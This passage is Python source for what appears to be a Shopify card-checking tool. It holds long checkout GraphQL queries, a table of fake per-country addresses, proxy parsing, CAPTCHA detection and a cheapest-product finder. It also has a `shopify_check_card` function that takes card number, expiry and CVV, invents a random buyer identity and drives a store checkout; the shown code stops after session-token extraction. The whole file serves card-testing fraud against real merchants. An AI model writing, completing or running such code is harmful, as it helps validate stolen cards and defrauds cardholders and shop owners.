__typename}sourceAmount{amount currencyCode __typename}__typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}__typename}__typename}fragment UiExtensionInstallationFragment on UiExtensionInstallation{extension{approvalScopes{handle __typename}capabilities{apiAccess networkAccess blockProgress collectBuyerConsent{smsMarketing customerPrivacy __typename}__typename}apiVersion appId appUrl preloads{target namespace value __typename}appName extensionLocale extensionPoints name registrationUuid scriptUrl translations uuid version __typename}__typename}fragment CustomerCreditCardPaymentMethodFragment on CustomerCreditCardPaymentMethod{cvvSessionId paymentMethodIdentifier token displayLastDigits brand defaultPaymentMethod deletable requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaypalBillingAgreementPaymentMethodFragment on PaypalBillingAgreementPaymentMethod{paymentMethodIdentifier token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaymentLines on PaymentLine{stableId specialInstructions amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier creditCard{...on CreditCard{brand lastDigits name __typename}__typename}paymentAttributes __typename}...on GiftCardPaymentMethod{code balance{amount currencyCode __typename}__typename}...on RedeemablePaymentMethod{...RedeemablePaymentMethodFragment __typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier __typename}...on PaypalWalletContent{paypalBillingAddress:billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token paymentMethodIdentifier acceptedSubscriptionTerms expiresAt merchantId __typename}...on ApplePayWalletContent{data signature version lastDigits paymentMethodIdentifier header{applicationData ephemeralPublicKey publicKeyHash transactionId __typename}__typename}...on GooglePayWalletContent{signature signedMessage protocolVersion paymentMethodIdentifier __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode paymentMethodIdentifier __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken paymentMethodIdentifier __typename}__typename}__typename}...on LocalPaymentMethod{paymentMethodIdentifier name additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on OffsitePaymentMethod{paymentMethodIdentifier name __typename}...on CustomPaymentMethod{id name additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name paymentAttributes __typename}...on ManualPaymentMethod{id name paymentMethodIdentifier __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{...CustomerCreditCardPaymentMethodFragment __typename}...on PaypalBillingAgreementPaymentMethod{...PaypalBillingAgreementPaymentMethodFragment __typename}...on NoopPaymentMethod{__typename}__typename}__typename}
"""

QUERY_POLL = """query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl shopPay shopPayInstallments analytics{checkoutCompletedEventId emitConversionEvent __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId isFirstOrder eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{...on MultibancoBuyerActionInfo{entity reference __typename}__typename}__typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}__typename}...on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionToken totalAmountToPay{amount currencyCode __typename}checkoutCompletionTarget delivery{...on PurchaseOrderDeliveryTerms{deliveryLines{__typename availableOn deliveryStrategy{handle title description methodType brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl lightThemeCompactLogoUrl darkThemeCompactLogoUrl name __typename}pickupLocation{...on PickupInStoreLocation{name address{address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}instructions __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyBreakdown{__typename amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}...on PurchaseOrderLineComponent{stableId quantity componentCapabilities componentSource merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}lineAmount{amount currencyCode __typename}lineAmountAfterDiscounts{amount currencyCode __typename}destinationAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}__typename}groupType targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}...on PurchaseOrderLineComponent{stableId componentCapabilities componentSource quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}__typename}deliveryExpectations{__typename brandedPromise{name logoUrl handle lightThemeLogoUrl darkThemeLogoUrl __typename}deliveryStrategyHandle deliveryExpectationPresentmentTitle{short long __typename}returnability{returnable __typename}}payment{...on PurchaseOrderPaymentTerms{billingAddress{__typename...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}}paymentLines{amount{amount currencyCode __typename}postPaymentMessage dueAt paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier vaultingAgreement creditCard{brand lastDigits __typename}billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomerCreditCardPaymentMethod{brand displayLastDigits token deletable defaultPaymentMethod requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on PurchaseOrderGiftCardPaymentMethod{balance{amount currencyCode __typename}code __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier paymentMethod paymentAttributes __typename}...on PaypalWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token expiresAt __typename}...on ApplePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}data signature version __typename}...on GooglePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}signature signedMessage protocolVersion __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken creditCard{brand lastDigits __typename}__typename}__typename}__typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on LocalPaymentMethod{paymentMethodIdentifier name displayName billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on ManualPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on PaypalBillingAgreementPaymentMethod{token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{redemptionPaymentOptionKind billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}__typename}__typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name __typename}__typename}__typename}__typename}__typename}buyerIdentity{...on PurchaseOrderBuyerIdentityTerms{contactMethod{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}marketingConsent{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}__typename}customer{__typename...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}__typename}...on DecodedCustomerProfile{id presentmentCurrency fullName firstName lastName countryCode email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone __typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl email ordersCount phone market{id handle __typename}__typename}}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name __typename}__typename}__typename}merchandise{taxesIncluded merchandiseLines{stableId legacyFee merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}lineComponents{...PurchaseOrderBundleLineComponent __typename}components{...PurchaseOrderLineComponent __typename}quantity{__typename...on PurchaseOrderMerchandiseQuantityByItem{items __typename}}recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}lineAmount{__typename amount currencyCode}__typename}__typename}tax{totalTaxAmountV2{__typename amount currencyCode}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}totalAmountIncludedInTarget{amount currencyCode __typename}__typename}discounts{lines{...PurchaseOrderDiscountLineFragment __typename}__typename}legacyRepresentProductsAsFees totalSavings{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}legacySubtotalBeforeTaxesShippingAndFees{amount currencyCode __typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}dutiesIncluded tip{tipLines{amount{amount currencyCode __typename}__typename}__typename}hasOnlyDeferredShipping note{customAttributes{key value __typename}message __typename}shopPayArtifact{optIn{vaultPhone __typename}__typename}recurringTotals{fixedPrice{amount currencyCode __typename}fixedPriceCount interval intervalCount recurringPrice{amount currencyCode __typename}title __typename}checkoutTotalBeforeTaxesAndShipping{__typename amount currencyCode}checkoutTotal{__typename amount currencyCode}checkoutTotalTaxes{__typename amount currencyCode}subtotalBeforeReductions{__typename amount currencyCode}deferredTotal{amount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}dueAt subtotalAmount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}taxes{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}metafields{key namespace value valueType:type __typename}}fragment ProductVariantSnapshotMerchandiseDetails on ProductVariantSnapshot{variantId options{name value __typename}productTitle title productUrl untranslatedTitle untranslatedSubtitle sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}deferredAmount{amount currencyCode __typename}digest giftCard image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}price{amount currencyCode __typename}productId productType properties{...MerchandiseProperties __typename}requiresShipping sku taxCode taxable vendor weight{unit value __typename}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment PurchaseOrderBundleLineComponent on PurchaseOrderBundleLineComponent{stableId merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderLineComponent on PurchaseOrderLineComponent{stableId componentCapabilities componentSource merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderDiscountLineFragment on PurchaseOrderDiscountLine{discount{...DiscountDetailsFragment __typename}lineAmount{amount currencyCode __typename}deliveryAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}merchandiseAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}__typename}
""" 

C2C = {
    "USD": "US",
    "CAD": "CA",
    "INR": "IN",
    "AED": "AE",
    "HKD": "HK",
    "GBP": "GB",
    "CHF": "CH",
}

book = {
    "US": {"address1": "123 Main St", "city": "New York", "postalCode": "10001", "zoneCode": "NY", "countryCode": "US", "phone": "2125550199"},
    "CA": {"address1": "88 Queen St", "city": "Toronto", "postalCode": "M5J2J3", "zoneCode": "ON", "countryCode": "CA", "phone": "4165550198"},
    "GB": {"address1": "221B Baker St", "city": "London", "postalCode": "NW1 6XE", "zoneCode": "LND", "countryCode": "GB", "phone": "2079460123"},
    "IN": {"address1": "221B MG Rd", "city": "Mumbai", "postalCode": "400001", "zoneCode": "MH", "countryCode": "IN", "phone": "9876543210"},
    "AE": {"address1": "Burj Tower", "city": "Dubai", "postalCode": "00000", "zoneCode": "DU", "countryCode": "AE", "phone": "501234567"},
    "HK": {"address1": "Nathan Rd 88", "city": "Kowloon", "postalCode": "00000", "zoneCode": "KL", "countryCode": "HK", "phone": "55555555"},
    "CN": {"address1": "8 Zhongguancun St", "city": "Beijing", "postalCode": "100080", "zoneCode": "BJ", "countryCode": "CN", "phone": "1062512345"},
    "CH": {"address1": "Gotthardstrasse 17", "city": "Schweiz", "postalCode": "6430", "zoneCode": "SZ", "countryCode": "CH", "phone": "445512345"},
    "AU": {"address1": "1 Martin Place", "city": "Sydney", "postalCode": "2000", "zoneCode": "NSW", "countryCode": "AU", "phone": "291234567"},
    "DEFAULT": {"address1": "123 Main St", "city": "New York", "postalCode": "10001", "zoneCode": "NY", "countryCode": "US", "phone": "2125550199"},
}

def pick_addr(url, cc=None, rc=None):
    cc = (cc or "").upper()
    rc = (rc or "").upper()
    dom = urlparse(url).netloc
    tcn = dom.split('.')[-1].upper()
    if tcn in book:
        return book[tcn]
    ccn = C2C.get(cc)
    if rc in book and ccn == rc:
        return book[rc]
    elif rc in book:
        return book[rc]
    return book["DEFAULT"]

def extract_between(text, start, end):
    if not text or not start or not end:
        return None
    try:
        if start in text:
            parts = text.split(start, 1)
            if len(parts) > 1:
                if end in parts[1]:
                    result = parts[1].split(end, 1)[0]
                    return result if result else None
        return None
    except Exception:
        return None

def parse_proxy(proxy_str):
    if not proxy_str:
        return None
    if '@' in proxy_str:
        if not proxy_str.startswith('http://') and not proxy_str.startswith('https://'):
            return f"http://{proxy_str}"
        return proxy_str
    parts = proxy_str.split(':')
    if len(parts) == 2:
        ip, port = parts
        return f"http://{ip}:{port}"
    elif len(parts) == 4:
        ip, port, user, password = parts
        return f"http://{user}:{password}@{ip}:{port}"
    else:
        if not proxy_str.startswith('http://') and not proxy_str.startswith('https://'):
            return f"http://{proxy_str}"
        return proxy_str

def is_captcha_required(response_text):
    if not response_text:
        return False
    indicators = [
        'CAPTCHA_REQUIRED',
        '"code":"CAPTCHA_REQUIRED"',
        "'code':'CAPTCHA_REQUIRED'",
        '"message":"CAPTCHA_REQUIRED"',
        'captcha required',
        'CAPTCHA CHALLENGE',
        'hcaptcha',
        'h-captcha'
    ]
    text_upper = response_text.upper()
    for indicator in indicators:
        if indicator.upper() in text_upper:
            return True
    return False

async def make_graphql_request_with_captcha_handling(
    session, graphql_url, params, headers, json_data,
    checkout_url, max_retries=1, solve_captcha=True
):
    for attempt in range(max_retries + 1):
        try:
            response = await session.post(graphql_url, params=params, headers=headers, json=json_data)
            response_text = await response.text()
            return response, response_text, False
        except Exception as e:
            if attempt == max_retries:
                return None, str(e), False
            await asyncio.sleep(1)
    return response, response_text, False

async def fetch_products(domain, proxy_str=None):
    try:
        if not domain.startswith('http'):
            domain = "https://" + domain
        
        domain = domain.rstrip('/')
        
        connector = aiohttp.TCPConnector(ssl=False)
        timeout = aiohttp.ClientTimeout(total=15)
        
        proxy = parse_proxy(proxy_str) if proxy_str else None
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            url = f"{domain}/products.json?limit=250"
            
            async with session.get(url, proxy=proxy, timeout=15) as resp:
                if resp.status != 200:
                    return False, f"Site Error! Status: {resp.status}"
                
                try:
                    data = await resp.json()
                except json.JSONDecodeError as e:
                    text = await resp.text()
                    return False, f"JSON Parse Error: {str(e)}"
                
                if 'products' not in data:
                    return False, "No products key in response"
                
                result = data['products']
                if not result:
                    return False, "No Products Found!"

        min_price = None
        min_product = None

        for product in result:
            if not product.get('variants'):
                continue
            
            for variant in product['variants']:
                if not variant.get('available', True):
                    continue
                
                try:
                    price = variant.get('price', '0')
                    if isinstance(price, str):
                        price = float(price.replace(',', ''))
                    else:
                        price = float(price)

                    if min_price is None or price < min_price:
                        min_price = price
                        min_product = {
                            'site': domain,
                            'price': f"{price:.2f}",
                            'variant_id': str(variant['id']),
                            'link': f"{domain}/products/{product['handle']}",
                            'product_title': product.get('title', 'Unknown'),
                            'variant_title': variant.get('title', 'Default')
                        }
                except (ValueError, TypeError, AttributeError):
                    continue
        
        if min_product and min_product.get('variant_id'):
            print(f"✅ اختار منتج بسعر: ${min_price}")
            return min_product
        else:
            return False, "No available products found!"

    except aiohttp.ClientConnectorError as e:
        return False, f"Cannot connect to {domain}"
    except aiohttp.ClientProxyConnectionError as e:
        return False, f"Proxy Connection Error"
    except asyncio.TimeoutError:
        return False, "Timeout"
    except Exception as e:
        return False, f"Error: {str(e)}"

async def add_to_cart(session, domain, variant_id, proxy=None):
    cart_url = f"{domain}/cart/add.js"
    
    headers_json = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
        'Content-Type': 'application/json',
        'Accept': 'application/json',
        'Accept-Language': 'en-US,en;q=0.9',
        'Origin': domain,
        'Referer': domain + '/'
    }
    
    cart_data = {'items': [{'id': int(variant_id), 'quantity': 1}]}
    
    try:
        resp = await session.post(cart_url, json=cart_data, headers=headers_json, proxy=proxy)
        
        if resp.status == 200:
            try:
                data = await resp.json()
                return True, data
            except:
                return True, await resp.text()
        
        error_text = await resp.text()
        return False, f"Status {resp.status}: {error_text[:300]}"
        
    except Exception as e:
        return False, f"Exception: {str(e)}"

def extract_clean_response(message):
    if message is None:
        return "UNKNOWN_ERROR"
    if not message:
        return "UNKNOWN_ERROR"
    message = str(message)
    if "ORDER_PLACED" in message:
        return "ORDER_PLACED"
    patterns = [
        r'(PAYMENTS_[A-Z_]+)',
        r'(CARD_[A-Z_]+)',
        r'([A-Z]+_[A-Z]+_[A-Z_]+)',
        r'([A-Z]+_[A-Z_]+)',
        r'code["\']?\s*[:=]\s*["\']?([^"\',]+)["\']?',
        r'{"code":"([^"]+)"',
        r"'code':'([^']+)'"
    ]
    for pattern in patterns:
        matches = re.findall(pattern, message, re.IGNORECASE)
        for match in matches:
            if isinstance(match, tuple):
                match = match[0]
            if match and "_" in match and len(match) < 50:
                match = match.strip("{}:'\" ")
                return match
    words = message.split()
    if words:
        first_word = words[0]
        if "_" in first_word and first_word.isupper():
            return first_word
    return message[:50] if message else "UNKNOWN_ERROR"

async def shopify_check_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None):
    gateway = "UNKNOWN"
    total_price = "0.00"
    currency = "USD"
    
    ourl = site_url if site_url.startswith('http') else f'https://{site_url}'
    proxy = parse_proxy(proxy_str) if proxy_str else None
    checkpoint_data = None
    running_total = "0.00"

    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Content-Type': 'application/json',
            'Origin': ourl,
            'Referer': ourl,
            'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"'
        }

        address_info = pick_addr(ourl)
        country_code = address_info["countryCode"]
        
        first_names = ["James", "John", "Robert", "Michael", "William", "David", "Mary", "Patricia", "Jennifer", "Linda"]
        last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez"]
        firstName = random.choice(first_names)
        lastName = random.choice(last_names)
        
        domains = ["gmail.com", "yahoo.com", "outlook.com", "protonmail.com", "hotmail.com"]
        email = f"{firstName.lower()}.{lastName.lower()}@{random.choice(domains)}"
        
        phone = address_info["phone"]
        street = address_info["address1"]
        city = address_info["city"]
        state = address_info["zoneCode"]
        s_zip = address_info["postalCode"]
        address2 = ""

        if not variant_id:
            info = await fetch_products(ourl, proxy_str)
            if isinstance(info, tuple) and info[0] is False:
                return False, f"Product fetch failed: {info[1]}", gateway, total_price, currency
            variant_id = info['variant_id']

        connector = aiohttp.TCPConnector(ssl=False)
        timeout = aiohttp.ClientTimeout(total=30)
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            cart_success, cart_result = await add_to_cart(session, ourl, variant_id, proxy)
            
            if not cart_success:
                return False, f"Cart failed: {cart_result}", gateway, total_price, currency

            checkout_headers = {
                **headers,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1'
            }
            
            checkout_url = ourl + '/checkout/'
            response = await session.post(url=checkout_url, allow_redirects=True, headers=checkout_headers, proxy=proxy)
            checkout_url_final = str(response.url)

            attempt_token_match = re.search(r'/checkouts/cn/([^/?]+)', checkout_url_final)
            attempt_token = attempt_token_match.group(1) if attempt_token_match else checkout_url_final.split('/')[-1].split('?')[0]

            if 'login' in checkout_url_final.lower():
                return False, "Site requires login!", gateway, total_price, currency

            sst = response.headers.get('X-Checkout-One-Session-Token') or response.headers.get('x-checkout-one-session-token')
            text = await response.text()
            
            if not sst:
                sst = extract_between(text, 'name="serialized-sessionToken" content="&quot;', '&quot;')
                if not sst:
                    sst = extract_between(text, 'name="serialized-sessionToken" content="', '"')
                if not sst:
                    sst = extract_between(text, '"serializedSessionToken":"', '"')
                if not sst:
                    sst = extract_between(text, 'data-session-token="', '"')
                if not sst:
                    sst = extract_between(text, '"sessionToken":"', '"')
            
            if not sst:
                return False, "Failed to get session token", gateway, total_price, currency

